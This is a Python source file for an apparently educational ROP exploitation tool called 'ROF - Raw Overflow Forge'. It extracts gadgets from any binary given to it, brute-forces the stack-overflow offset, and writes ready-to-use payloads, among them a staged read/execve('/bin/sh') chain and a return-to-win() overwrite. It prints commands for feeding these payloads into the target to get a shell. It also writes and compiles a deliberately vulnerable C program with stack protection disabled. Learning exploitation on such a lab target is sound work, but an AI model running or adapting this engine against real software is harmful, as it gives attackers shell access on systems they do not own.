#!/usr/bin/env python3
"""
ROF - Raw Overflow Forge
All-in-One ROP Exploitation Engine
Developed for ROP technique learning
"""

import sys
import os
import struct
import re
import subprocess
from collections import defaultdict
from dataclasses import dataclass, field
from typing import List, Dict, Tuple, Optional

# ============================================================================
# SECTION 1: CONSTANTS AND ENUMERATIONS
# ============================================================================

# ANSI color codes
class Colors:
    RED = "\033[1;31m"
    GREEN = "\033[1;32m"
    YELLOW = "\033[1;33m"
    BLUE = "\033[1;34m"
    MAGENTA = "\033[1;35m"
    CYAN = "\033[1;36m"
    RESET = "\033[0m"

# x86_64 registers
class Reg:
    RAX, RCX, RDX, RBX, RSP, RBP, RSI, RDI, R8, R9, R10, R11, R12, R13, R14, R15 = range(16)

REG_NAMES = [
    "rax", "rcx", "rdx", "rbx", "rsp", "rbp", "rsi", "rdi",
    "r8", "r9", "r10", "r11", "r12", "r13", "r14", "r15"
]

# Binary file types
class BinaryType:
    ELF = "elf"
    PE = "pe"
    UNKNOWN = "unknown"

# ============================================================================
# SECTION 2: DATA STRUCTURES
# ============================================================================

@dataclass
class Gadget:
    """Represents a ROP gadget"""
    addr: int = 0
    disasm: str = ""
    bytes_data: bytes = b""
    is_ret: bool = False
    is_pop: bool = False
    is_syscall: bool = False
    is_mov: bool = False
    is_xor: bool = False
    pop_regs: List[str] = field(default_factory=list)
    
    def __str__(self):
        regs = f" [{', '.join(self.pop_regs)}]" if self.pop_regs else ""
        return f"0x{self.addr:x}: {self.disasm}{regs}"

@dataclass
class BinaryInfo:
    """Information about the analyzed binary"""
    path: str = ""
    type: str = BinaryType.UNKNOWN
    arch: str = "x64"
    entry_point: int = 0
    base_addr: int = 0x400000
    size: int = 0
    sections: Dict[str, Tuple[int, int]] = field(default_factory=dict)
    
    def print_info(self):
        """Displays binary information"""
        print(f"{Colors.CYAN}[+] Analyzing binary: {self.path}")
        print(f"    Type: {self.type.upper()}")
        print(f"    Architecture: {self.arch}")
        print(f"    Entry point: 0x{self.entry_point:x}")
        print(f"    Base address: 0x{self.base_addr:x}")
        print(f"    Size: {self.size:,} bytes")
        
        if self.sections:
            print(f"\n    Sections:")
            for name, (addr, size) in self.sections.items():
                print(f"      {name:12s} @ 0x{addr:012x} (0x{size:x})")

@dataclass
class ExploitGoal:
    """Exploitation goals"""
    offset: int = 72
    syscall_num: int = 59  # execve
    reg_values: Dict[str, int] = field(default_factory=dict)
    use_bss: bool = True
    bss_addr: int = 0

# ============================================================================
# SECTION 3: UTILITY FUNCTIONS
# ============================================================================

def print_color(color: str, message: str, *args):
    """Prints a colored message"""
    formatted = message % args if args else message
    print(f"{color}{formatted}{Colors.RESET}")

def error(message: str, *args):
    """Prints an error message"""
    print_color(Colors.RED, "[-] " + message, *args)

def success(message: str, *args):
    """Prints a success message"""
    print_color(Colors.GREEN, "[+] " + message, *args)

def info(message: str, *args):
    """Prints an information message"""
    print_color(Colors.CYAN, "[*] " + message, *args)

def warning(message: str, *args):
    """Prints a warning message"""
    print_color(Colors.YELLOW, "[!] " + message, *args)

def hex_dump(data: bytes, start_addr: int = 0, bytes_per_line: int = 16):
    """Displays a hexadecimal dump"""
    for i in range(0, len(data), bytes_per_line):
        chunk = data[i:i+bytes_per_line]
        hex_str = ' '.join(f"{b:02x}" for b in chunk)
        ascii_str = ''.join(chr(b) if 32 <= b < 127 else '.' for b in chunk)
        print(f"    {start_addr+i:08x}: {hex_str:<48}  {ascii_str}")

# ============================================================================
# SECTION 4: BINARY ANALYSIS
# ============================================================================

class BinaryAnalyzer:
    """Binary file analyzer"""
    
    @staticmethod
    def analyze(path: str) -> BinaryInfo:
        """Analyzes a binary file"""
        info = BinaryInfo(path=path)
        
        try:
            with open(path, 'rb') as f:
                data = f.read()
        except FileNotFoundError:
            error("File not found: %s", path)
            return info
        
        info.size = len(data)
        
        if len(data) < 100:
            error("File too small")
            return info
        
        # File type detection
        if data[0:4] == b'\x7fELF':
            info.type = BinaryType.ELF
            info = BinaryAnalyzer._analyze_elf(data, info)
        elif data[0:2] == b'MZ':
            info.type = BinaryType.PE
            info = BinaryAnalyzer._analyze_pe(data, info)
        
        # Search for important sections
        info = BinaryAnalyzer._find_sections(data, info)
        
        return info
    
    @staticmethod
    def _analyze_elf(data: bytes, info: BinaryInfo) -> BinaryInfo:
        """Analyzes an ELF file"""
        if len(data) < 64:
            return info
        
        # 32-bit or 64-bit
        info.arch = "64-bit" if data[4] == 2 else "32-bit"
        
        if info.arch == "64-bit":
            info.entry_point = struct.unpack('<Q', data[24:32])[0]
        else:
            info.entry_point = struct.unpack('<I', data[24:28])[0]
        
        info.base_addr = info.entry_point & 0xfffffffffffff000
        
        return info
    
    @staticmethod
    def _analyze_pe(data: bytes, info: BinaryInfo) -> BinaryInfo:
        """Analyzes a PE file"""
        # Simplified for this demonstration
        info.base_addr = 0x140000000
        return info
    
    @staticmethod
    def _find_sections(data: bytes, info: BinaryInfo) -> BinaryInfo:
        """Searches for important sections"""
        sections_to_find = [b'.text', b'.data', b'.bss', b'.got', b'.plt']
        
        for i in range(len(data) - 8):
            for section in sections_to_find:
                if data[i:i+len(section)] == section:
                    section_name = section.decode('ascii', errors='ignore')
                    # Address estimation (simplified)
                    addr = info.base_addr + i
                    info.sections[section_name] = (addr, 0x1000)
        
        return info

# ============================================================================
# SECTION 5: GADGET EXTRACTION
# ============================================================================

class GadgetExtractor:
    """ROP gadget extractor"""
    
    def __init__(self):
        self.gadgets: List[Gadget] = []
    
    def extract_all(self, binary_path: str) -> List[Gadget]:
        """Extracts gadgets using all available methods"""
        success("Extracting gadgets...")
        
        # Method 1: Pattern search
        self._extract_by_patterns(binary_path)
        
        # Method 2: Objdump
        self._extract_with_objdump(binary_path)
        
        # Method 3: Capstone (if available)
        self._try_capstone(binary_path)
        
        # Remove duplicates
        self._deduplicate()
        
        success("Extraction complete: %d gadgets found", len(self.gadgets))
        return self.gadgets
    
    def _extract_by_patterns(self, binary_path: str):
        """Extracts gadgets by searching for patterns"""
        try:
            with open(binary_path, 'rb') as f:
                data = f.read()
        except:
            return
        
        base_addr = 0x400000
        
        # Common gadget patterns
        patterns = {
            'ret': (b'\xC3', ['ret']),
            'pop rdi; ret': (b'\x5F\xC3', ['pop rdi', 'ret']),
            'pop rsi; ret': (b'\x5E\xC3', ['pop rsi', 'ret']),
            'pop rdx; ret': (b'\x5A\xC3', ['pop rdx', 'ret']),
            'pop rax; ret': (b'\x58\xC3', ['pop rax', 'ret']),
            'syscall; ret': (b'\x0F\x05\xC3', ['syscall', 'ret']),
            'xor eax, eax; ret': (b'\x31\xC0\xC3', ['xor eax, eax', 'ret']),
        }
        
        for name, (pattern_bytes, instructions) in patterns.items():
            offset = 0
            while offset < len(data):
                pos = data.find(pattern_bytes, offset)
                if pos == -1:
                    break
                
                gadget = Gadget(
                    addr=base_addr + pos,
                    disasm=' ; '.join(instructions),
                    is_ret='ret' in name,
                    is_pop='pop' in name,
                    is_syscall='syscall' in name,
                    is_xor='xor' in name
                )
                
                if gadget.is_pop:
                    for instr in instructions:
                        if instr.startswith('pop '):
                            gadget.pop_regs.append(instr[4:])
                
                self.gadgets.append(gadget)
                offset = pos + 1
    
    def _extract_with_objdump(self, binary_path: str):
        """Extracts gadgets with objdump"""
        try:
            cmd = ['objdump', '-d', '--no-show-raw-insn', binary_path]
            result = subprocess.run(cmd, capture_output=True, text=True, timeout=10)
            
            if result.returncode != 0:
                return
            
            lines = result.stdout.split('\n')
            current_addr = 0
            current_insns = []
            
            for line in lines:
                line = line.strip()
                
                if ':' in line and not line.startswith(' '):
                    # Save previous gadget if it ends with ret
                    if current_insns and any('ret' in i.lower() for i in current_insns):
                        disasm = ' ; '.join(current_insns)
                        gadget = Gadget(
                            addr=current_addr,
                            disasm=disasm,
                            is_ret=True,
                            is_pop=any('pop' in i.lower() for i in current_insns),
                            is_syscall=any('syscall' in i.lower() for i in current_insns)
                        )
                        
                        if gadget.is_pop:
                            for instr in current_insns:
                                if 'pop' in instr.lower():
                                    match = re.search(r'pop\s+(\w+)', instr.lower())
                                    if match:
                                        gadget.pop_regs.append(match.group(1))
                        
                        self.gadgets.append(gadget)
                    
                    # New gadget
                    parts = line.split(':')
                    if len(parts) >= 2:
                        try:
                            current_addr = int(parts[0].strip(), 16)
                            instr = parts[1].strip().split('\t')[-1]
                            current_insns = [instr] if instr else []
                        except:
                            current_insns = []
                
                elif line and current_insns:
                    # Continuation of gadget
                    instr = line.split('\t')[-1].strip()
                    if instr:
                        current_insns.append(instr)
            
            # Save the last gadget
            if current_insns and any('ret' in i.lower() for i in current_insns):
                disasm = ' ; '.join(current_insns)
                gadget = Gadget(
                    addr=current_addr,
                    disasm=disasm,
                    is_ret=True,
                    is_pop=any('pop' in i.lower() for i in current_insns)
                )
                self.gadgets.append(gadget)
                
        except Exception as e:
            error("Objdump error: %s", str(e))
    
    def _try_capstone(self, binary_path: str):
        """Extract ROP gadgets using Capstone (much more accurate)"""
        try:
            from capstone import Cs, CS_ARCH_X86, CS_MODE_64
            from capstone.x86 import X86_OP_REG, X86_REG_RDI, X86_REG_RSI, X86_REG_RDX, X86_REG_RAX

            with open(binary_path, 'rb') as f:
                data = f.read()

            cs = Cs(CS_ARCH_X86, CS_MODE_64)
            cs.detail = True

            base_addr = 0x400000  # Or use binary_info.base_addr

            # Search for all ret instructions
            for i in range(len(data) - 20, -1, -1):  # Start from the end
                if data[i] != 0xc3:
                    continue

                # Try to disassemble up to 20 instructions before ret
                for length in range(1, 21):
                    start = i - length + 1
                    if start < 0:
                        break

                    chunk = data[start:i+1]
                    try:
                        insns = list(cs.disasm(chunk, base_addr + start))
                        if not insns or insns[-1].mnemonic != 'ret':
                            continue

                        # Success! This is a complete gadget
                        pop_regs = []
                        is_syscall = False
                        for insn in insns:
                            if insn.mnemonic == 'pop':
                                if insn.operands[0].type == X86_OP_REG:
                                    reg_id = insn.operands[0].reg
                                    if reg_id == X86_REG_RDI:
                                        pop_regs.append('rdi')
                                    elif reg_id == X86_REG_RSI:
                                        pop_regs.append('rsi')
                                    elif reg_id == X86_REG_RDX:
                                        pop_regs.append('rdx')
                                    elif reg_id == X86_REG_RAX:
                                        pop_regs.append('rax')
                            elif insn.mnemonic == 'syscall':
                                is_syscall = True

                        gadget = Gadget(
                            addr=base_addr + start,
                            disasm=' ; '.join(f"{i.mnemonic} {i.op_str}".strip() for i in insns),
                            is_ret=True,
                            is_pop=bool(pop_regs),
                            is_syscall=is_syscall,
                            pop_regs=pop_regs
                        )

                        self.gadgets.append(gadget)
                        break  # Stop searching for this ret

                    except:
                        continue

            info("Capstone extraction successful: added precise gadgets")

        except ImportError:
            info("Capstone not installed (pip install capstone) - using basic methods")
        except Exception as e:
            error("Capstone error: %s", str(e))
            
            
    def _deduplicate(self):
        """Removes duplicate gadgets"""
        unique = {}
        for gadget in self.gadgets:
            if gadget.addr not in unique:
                unique[gadget.addr] = gadget
            elif len(gadget.disasm) < len(unique[gadget.addr].disasm):
                # Keep the shortest representation
                unique[gadget.addr] = gadget
        
        self.gadgets = list(unique.values())
        self.gadgets.sort(key=lambda g: g.addr)

# ============================================================================
# SECTION 6: ANALYSIS AND CLASSIFICATION
# ============================================================================

class GadgetAnalyzer:
    """Gadget analyzer and classifier"""
    
    def __init__(self, gadgets: List[Gadget]):
        self.gadgets = gadgets
        self.categories = defaultdict(list)
        self._categorize()
    
    def _categorize(self):
        """Categorizes gadgets"""
        for gadget in self.gadgets:
            disasm = gadget.disasm.lower()
            
            if gadget.is_ret:
                self.categories['ret'].append(gadget)
            
            if gadget.is_pop:
                for reg in gadget.pop_regs:
                    self.categories[f'pop_{reg}'].append(gadget)
            
            if gadget.is_syscall:
                self.categories['syscall'].append(gadget)
            
            if gadget.is_xor:
                self.categories['xor'].append(gadget)
            
            if gadget.is_mov:
                self.categories['mov'].append(gadget)
    
    def print_statistics(self):
        """Displays statistics"""
        success("Gadget statistics:")
        print("    " + "-" * 40)
        
        for category in sorted(self.categories.keys()):
            count = len(self.categories[category])
            print(f"    {category:12s}: {count:3d}")
    
    def find_best_gadgets(self) -> Dict[str, Gadget]:
        """Finds the best gadgets for each category"""
        best = {}
        
        important_categories = ['pop_rdi', 'pop_rsi', 'pop_rdx', 'pop_rax', 'syscall', 'ret']
        
        for category in important_categories:
            if category in self.categories and self.categories[category]:
                # Take the shortest gadget
                gadgets = self.categories[category]
                best_gadget = min(gadgets, key=lambda g: len(g.disasm))
                best[category] = best_gadget
        
        return best
    
    def check_execve_chain(self) -> bool:
        """Checks if a complete execve chain can be built"""
        required = ['pop_rdi', 'pop_rsi', 'pop_rdx', 'pop_rax', 'syscall']
        available = []
        missing = []
        
        for req in required:
            if req in self.categories and self.categories[req]:
                available.append(req)
            else:
                missing.append(req)
        
        if available:
            info("Available gadgets: %s", ', '.join(available))
        
        if missing:
            warning("Missing gadgets: %s", ', '.join(missing))
            return False
        
        success("Complete execve chain can be built!")
        return True

# ============================================================================
# SECTION 7: PAYLOAD CONSTRUCTION
# ============================================================================

class PayloadBuilder:
    """ROP payload builder"""
    
    @staticmethod
    def build_simple_rop(best_gadgets: Dict[str, Gadget], offset: int) -> bytes:
        """Builds a simple ROP payload"""
        payload = bytearray()
        
        # Padding
        payload.extend(b'A' * offset)
        
        # Simple ROP chain
        if 'pop_rdi' in best_gadgets:
            gadget = best_gadgets['pop_rdi']
            payload.extend(struct.pack('<Q', gadget.addr))
            payload.extend(struct.pack('<Q', 0xdeadbeefdeadbeef))
        
        if 'ret' in best_gadgets:
            gadget = best_gadgets['ret']
            payload.extend(struct.pack('<Q', gadget.addr))
        
        return bytes(payload)
    
    @staticmethod
    def build_staged_execve(best_gadgets: Dict[str, Gadget], offset: int, bss_addr: int) -> bytes:
        """Builds a staged execve payload (correct method)"""
        payload = bytearray()
        
        # Check required gadgets
        required = ['pop_rdi', 'pop_rsi', 'pop_rdx', 'pop_rax', 'syscall']
        for req in required:
            if req not in best_gadgets:
                error("Gadget %s missing for staged execve", req)
                return b''
        
        # Padding
        payload.extend(b'A' * offset)
        
        # Stage 1: read(0, .bss, 8) to write "/bin/sh"
        # pop rdi -> 0 (stdin)
        payload.extend(struct.pack('<Q', best_gadgets['pop_rdi'].addr))
        payload.extend(struct.pack('<Q', 0))
        
        # pop rsi -> .bss address
        payload.extend(struct.pack('<Q', best_gadgets['pop_rsi'].addr))
        payload.extend(struct.pack('<Q', bss_addr))
        
        # pop rdx -> 8 (byte count)
        payload.extend(struct.pack('<Q', best_gadgets['pop_rdx'].addr))
        payload.extend(struct.pack('<Q', 8))
        
        # pop rax -> 0 (sys_read)
        payload.extend(struct.pack('<Q', best_gadgets['pop_rax'].addr))
        payload.extend(struct.pack('<Q', 0))
        
        # syscall
        payload.extend(struct.pack('<Q', best_gadgets['syscall'].addr))
        
        # Stage 2: execve(.bss, 0, 0)
        # pop rdi -> .bss (pointer to "/bin/sh")
        payload.extend(struct.pack('<Q', best_gadgets['pop_rdi'].addr))
        payload.extend(struct.pack('<Q', bss_addr))
        
        # pop rsi -> 0 (argv)
        payload.extend(struct.pack('<Q', best_gadgets['pop_rsi'].addr))
        payload.extend(struct.pack('<Q', 0))
        
        # pop rdx -> 0 (envp)
        payload.extend(struct.pack('<Q', best_gadgets['pop_rdx'].addr))
        payload.extend(struct.pack('<Q', 0))
        
        # pop rax -> 59 (sys_execve)
        payload.extend(struct.pack('<Q', best_gadgets['pop_rax'].addr))
        payload.extend(struct.pack('<Q', 59))
        
        # syscall
        payload.extend(struct.pack('<Q', best_gadgets['syscall'].addr))
        
        return bytes(payload)
    
    @staticmethod
    def build_win_exploit(win_addr: int, offset: int) -> bytes:
        """Builds a simple exploit to call win()"""
        payload = bytearray()
        payload.extend(b'A' * offset)
        payload.extend(struct.pack('<Q', win_addr))
        return bytes(payload)

# ============================================================================
# SECTION 8: MAIN ENGINE
# ============================================================================

class ROFEngine:
    """Main ROF engine"""
    
    def __init__(self):
        self.binary_info = None
        self.gadgets = []
        self.analyzer = None
        self.goal = ExploitGoal()
    
    def run(self, binary_path: str, offset: int = None, use_bss: bool = True):
        """Runs the complete engine"""
        self._print_banner()
        
        # Step 1: Binary analysis
        info("Step 1/4: Binary analysis")
        self.binary_info = BinaryAnalyzer.analyze(binary_path)
        self.binary_info.print_info()
        
        # Set offset if not specified
        if offset is not None:
            self.goal.offset = offset
        else:
            # Default offset based on architecture
            self.goal.offset = 72 if self.binary_info.arch == "64-bit" else 40
        
        # Step 2: Gadget extraction
        info("Step 2/4: Gadget extraction")
        extractor = GadgetExtractor()
        self.gadgets = extractor.extract_all(binary_path)
        
        if not self.gadgets:
            error("No gadgets found!")
            return
        
        # Display samples
        info("Gadget samples (first 10):")
        for i, gadget in enumerate(self.gadgets[:10]):
            print(f"    [{i}] {gadget}")
        
        # Step 3: Gadget analysis
        info("Step 3/4: Gadget analysis")
        self.analyzer = GadgetAnalyzer(self.gadgets)
        self.analyzer.print_statistics()
        
        # Check execve chain
        can_execve = self.analyzer.check_execve_chain()
        
        # Find best gadgets
        best_gadgets = self.analyzer.find_best_gadgets()
        
        # Step 4: Payload construction
        info("Step 4/4: Payload construction")
        
        # Find .bss address
        bss_addr = 0x404000  # Reasonable default for non-PIE binaries
        if '.bss' in self.binary_info.sections:
            bss_addr = self.binary_info.sections['.bss'][0]  # ← Fixed: added the dot
            info(".bss section found at 0x%x", bss_addr)
        elif 'bss' in self.binary_info.sections:
            bss_addr = self.binary_info.sections['bss'][0]
            info("bss section (without dot) found at 0x%x", bss_addr)
        else:
            warning(".bss section not precisely found, using default 0x%x", bss_addr)
            warning("You can adjust manually if needed")
        
        self.goal.bss_addr = bss_addr
        
        # Build different payloads
        self._build_payloads(best_gadgets, can_execve)
        
        # Display final instructions
        self._print_final_instructions()
    
    def _build_payloads(self, best_gadgets: Dict[str, Gadget], can_execve: bool):
        """Builds different payloads"""
        # 1. Simple payload
        simple_payload = PayloadBuilder.build_simple_rop(best_gadgets, self.goal.offset)
        self._save_payload(simple_payload, 'simple_rop.bin')
        
        # 2. Win() payload if found
        win_addr = self._find_win_function()
        if win_addr:
            win_payload = PayloadBuilder.build_win_exploit(win_addr, self.goal.offset)
            self._save_payload(win_payload, 'win_exploit.bin')
        
        # 3. Staged execve payload if possible
        if can_execve:
            staged_payload = PayloadBuilder.build_staged_execve(
                best_gadgets, self.goal.offset, self.goal.bss_addr
            )
            if staged_payload:
                self._save_payload(staged_payload, 'staged_execve.bin')
                
                # Write the "/bin/sh" string separately
                with open('binsh_string.bin', 'wb') as f:
                    f.write(b'/bin/sh\0')
    
    def _find_win_function(self) -> Optional[int]:
        """Looks for win() function in the binary"""
        try:
            cmd = ['objdump', '-t', self.binary_info.path]
            result = subprocess.run(cmd, capture_output=True, text=True)
            
            for line in result.stdout.split('\n'):
                if 'win' in line and '.text' in line:
                    parts = line.split()
                    if len(parts) >= 1:
                        addr = int(parts[0], 16)
                        success("win() function found: 0x%x", addr)
                        return addr
            
            return None
        
        except:
            return None
    
    def _save_payload(self, payload: bytes, filename: str):
        """Saves a payload to a file"""
        if not payload:
            return
        
        with open(filename, 'wb') as f:
            f.write(payload)
        
        success("Payload saved: %s (%d bytes)", filename, len(payload))
        
        # Display hexadecimal dump
        if len(payload) <= 100:
            info("Hexadecimal dump:")
            hex_dump(payload[:min(80, len(payload))])
    
    def _print_banner(self):
        """Displays the banner"""
        banner = f"""
{Colors.CYAN}
╔══════════════════════════════════════════════════════════════╗
║                   ROF - Raw Overflow Forge                   ║
║          All-in-One ROP Exploitation Engine v1.0            ║
╚══════════════════════════════════════════════════════════════╝
{Colors.RESET}
"""
        print(banner)
    
    def _print_final_instructions(self):
        """Displays final instructions"""
        print(f"\n{Colors.GREEN}{'='*70}")
        print("FINAL INSTRUCTIONS")
        print('='*70 + f"{Colors.RESET}")
        
        print(f"\n{Colors.YELLOW}📦 Generated files:{Colors.RESET}")
        payload_files = ['simple_rop.bin', 'win_exploit.bin', 'staged_execve.bin']
        for f in payload_files:
            if os.path.exists(f):
                size = os.path.getsize(f)
                print(f"  ✓ {f:20s} ({size:6d} bytes)")
        
        if os.path.exists('binsh_string.bin'):
            print(f"  ✓ binsh_string.bin    (9 bytes)")
        
        print(f"\n{Colors.YELLOW}🔧 Recommended tests:{Colors.RESET}")
        
        if os.path.exists('win_exploit.bin'):
            print(f"\n1. Test win() exploit:")
            print(f"   $ ./{os.path.basename(self.binary_info.path)} < win_exploit.bin")
            print(f"   If RIP points to win(), the offset is correct!")
        
        if os.path.exists('staged_execve.bin'):
            print(f"\n2. Test staged execve exploit (correct method):")
            print(f"   $ (cat staged_execve.bin; echo -ne '/bin/sh\\x00'; cat -) | ./{os.path.basename(self.binary_info.path)}")
            print(f"   Then type: whoami")
            print(f"   Should display your username if successful")
        
        print(f"\n{Colors.YELLOW}🐛 Debugging with GDB:{Colors.RESET}")
        print(f"   $ gdb ./{os.path.basename(self.binary_info.path)}")
        print(f"   (gdb) break *vuln")
        print(f"   (gdb) run < staged_execve.bin")
        print(f"   (gdb) info registers")
        print(f"   (gdb) x/10i $rip")
        
        print(f"\n{Colors.YELLOW}📝 Parameters used:{Colors.RESET}")
        print(f"   Offset: {self.goal.offset}")
        print(f"   .bss address: 0x{self.goal.bss_addr:x}")
        
        print(f"\n{Colors.GREEN}{'='*70}")
        print("🎉 ROP EXPLOITATION READY! Good luck! 🚀")
        print('='*70 + f"{Colors.RESET}")

# ============================================================================
# SECTION 9: ADDITIONAL UTILITY FUNCTIONS
# ============================================================================

def find_offset(binary_path: str) -> Optional[int]:
    """Automatically finds the offset"""
    info("Automatically searching for offset...")
    
    # Simple De Bruijn pattern
    charset = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789"
    
    for offset in range(40, 200, 8):
        pattern = ""
        for i in range(offset + 8):  # +8 to go beyond saved RBP
            pattern += charset[i % len(charset)]
        
        payload = pattern.encode()
        
        try:
            proc = subprocess.Popen([f'./{binary_path}'], 
                                   stdin=subprocess.PIPE,
                                   stdout=subprocess.PIPE,
                                   stderr=subprocess.PIPE)
            
            stdout, stderr = proc.communicate(input=payload, timeout=2)
            
            if proc.returncode == -11:  # SIGSEGV
                success("Crash at offset %d", offset)
                return offset
        
        except:
            continue
    
    warning("Offset not found automatically")
    return None

def create_test_binary():
    """Creates a test binary rich in ROP gadgets"""
    test_code = """#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>

// Function full of useful gadgets for ROP
__attribute__((naked)) void useful_gadgets() {
    asm volatile (
        "pop_rax_ret: pop %%rax; ret;\\n"
        "pop_rdi_ret: pop %%rdi; ret;\\n"
        "pop_rsi_ret: pop %%rsi; ret;\\n"
        "pop_rdx_ret: pop %%rdx; ret;\\n"
        "pop_rbp_ret: pop %%rbp; ret;\\n"
        "syscall_ret: syscall; ret;\\n"
        "ret_only: ret;\\n"
        :::
    );
}

void win() {
    printf("\\n\\033[1;32m🎉 YOU WIN! Successfully exploited!\\033[0m\\n");
    system("/bin/sh");
}

void vulnerable() {
    char buffer[64];
    printf("Buffer @ %p\\n", buffer);
    printf("Enter payload: ");
    fflush(stdout);
    read(0, buffer, 512);
}

int main() {
    setvbuf(stdout, NULL, _IONBF, 0);
    setvbuf(stdin, NULL, _IONBF, 0);
    setvbuf(stderr, NULL, _IONBF, 0);

    printf("================================\\n");
    printf("\\033[1;36mROP Training Program - Created by ROF\\033[0m\\n");
    printf("================================\\n");
    printf("win(): %p\\n", win);
    printf("useful_gadgets(): %p\\n", useful_gadgets);
    printf("Try to get a shell!\\n\\n");

    vulnerable();
    
    printf("\\n\\033[1;31m[-] Failed to exploit\\033[0m\\n");
    return 0;
}
"""

    with open('vuln_test.c', 'w') as f:
        f.write(test_code)

    compile_cmd = [
        'gcc', 'vuln_test.c', '-o', 'vuln_test',
        '-fno-stack-protector', '-no-pie', '-O0'
    ]

    try:
        result = subprocess.run(compile_cmd, capture_output=True, text=True)
        if result.returncode == 0:
            os.chmod('vuln_test', 0o755)
            success("Test binary created successfully: vuln_test (rich in ROP gadgets)")
            return 'vuln_test'
        else:
            error("Compilation failed:")
            print(result.stderr.strip())
            print("\n[*] Manual command:")
            print("    gcc vuln_test.c -o vuln_test -fno-stack-protector -no-pie -O0")
            return None
    except Exception as e:
        error("Error: %s", str(e))
        return None
# ============================================================================
# SECTION 10: MAIN ENTRY POINT
# ============================================================================

def main():
    """Main function"""
    import argparse
    
    parser = argparse.ArgumentParser(
        description='ROF - All-in-One ROP Exploitation Engine',
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog="""
        Examples:
        %(prog)s vuln_test               # Complete automatic analysis on the binary
        %(prog)s vuln_test --offset 72    # Force a specific offset
        %(prog)s vuln_test --no-bss       # Disable using .bss for staged payload
        %(prog)s --create-test            # Create a vulnerable test binary then analyze it
            """
            )
    
    parser.add_argument(
        'binary',
        nargs='?',
        help='Path to vulnerable binary to analyze'
    )
    
    parser.add_argument(
        '--offset',
        type=int,
        default=None,
        help='Buffer overflow offset (number of bytes before RIP)'
    )
    
    parser.add_argument(
        '--no-bss',
        action='store_true',
        help='Do not use .bss section for staged payload'
    )
    
    parser.add_argument(
        '--create-test',
        action='store_true',
        help='Create a vulnerable test binary and analyze it automatically'
    )
    
    args = parser.parse_args()
    
    engine = ROFEngine()
    
    binary_to_analyze = None
    
    if args.create_test:
        binary_to_analyze = create_test_binary()
        if not binary_to_analyze:
            sys.exit(1)
    elif args.binary:
        if not os.path.exists(args.binary):
            error("Specified binary does not exist: %s", args.binary)
            sys.exit(1)
        if not os.access(args.binary, os.X_OK):
            warning("File is not executable. Some tests may fail.")
        binary_to_analyze = args.binary
    else:
        parser.print_help()
        print("\n[-] Error: you must specify a binary or use --create-test")
        sys.exit(1)
    
    # Automatic offset search if not provided
    if args.offset is None:
        auto_offset = find_offset(binary_to_analyze)
        if auto_offset:
            info("Offset found automatically: %d", auto_offset)
            engine.run(binary_to_analyze, offset=auto_offset, use_bss=not args.no_bss)
        else:
            warning("Offset not found automatically, using default value")
            engine.run(binary_to_analyze, offset=None, use_bss=not args.no_bss)
    else:
        engine.run(binary_to_analyze, offset=args.offset, use_bss=not args.no_bss)


if __name__ == "__main__":
    try:
        main()
    except KeyboardInterrupt:
        print(f"\n{Colors.RED}[!] Interrupted by user{Colors.RESET}")
        sys.exit(0)
    except Exception as e:
        error("Fatal error: %s", str(e))
        sys.exit(1)
